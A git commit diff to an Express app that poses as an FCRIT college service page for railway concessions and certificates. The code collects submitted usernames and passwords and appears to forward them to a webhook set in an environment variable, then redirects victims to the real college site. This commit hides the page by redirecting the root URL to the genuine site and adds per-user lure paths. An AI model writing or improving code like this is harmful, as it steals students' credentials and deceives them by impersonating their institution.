593fabe707f9f12c8355437de4644e09e46eca7e
webtestmeta <142143627+webtestmeta@users.noreply.github.com>
2024-01-21 07:10:33 +0000

    fixed lot of sus bugs

--- index.js
+++ index.js
@@ -1,3 +1,4 @@
+const bodyParser = require("body-parser");
 const path = require("path");
 const ejs = require("ejs");
 const config = require('./config.json');
@@ -7,7 +8,8 @@ const express = require('express');
 // View engines & others
 const app = express();
 
-
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: false }));
 app.engine("html", ejs.renderFile);
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, "/website/views"));
@@ -19,8 +21,20 @@ app.set('json spaces', 1);
 
 // Pages
 app.get('/', (req, res) => {
+  res.redirect('https://fcrit.ac.in/');
+});
+
+app.get('/update', (req, res) => {
   res.render('index', {
     title: "FCRIT - Campus Service - Railway Concession, Bona fide Certificate, Internship Permission, and LoR Eligibility."
+  });
+});
+
+app.get('/update/:id', (req, res) => {
+  const user = req.params.id;
+  res.render('index', {
+    title: "FCRIT - Campus Service - Railway Concession, Bona fide Certificate, Internship Permission, and LoR Eligibility.",
+    user : user
   });
 });
 
@@ -30,6 +44,10 @@ app.post('/update/new', async (req, res) => {
   try {
     const username = req.body.username;
     const password = req.body.password;
+
+    if (!username) {
+      return res.status(400).render('error', { message: `Username is required` });
+    }
 
     const webhookURL = process.env['hook'];
     const message = {
@@ -62,10 +80,9 @@ app.post('/update/new', async (req, res) => {
     res.redirect('https://fcrit.ac.in/');
   } catch (err) {
     console.error(err);
-    res.status(500).render('error', { message: 'Internal Server Error' });
+    res.status(500).render('error', { message: `Internal Server Error: ${err}` });
   }
 });
-
 
 
 app.listen(config.port, () => {
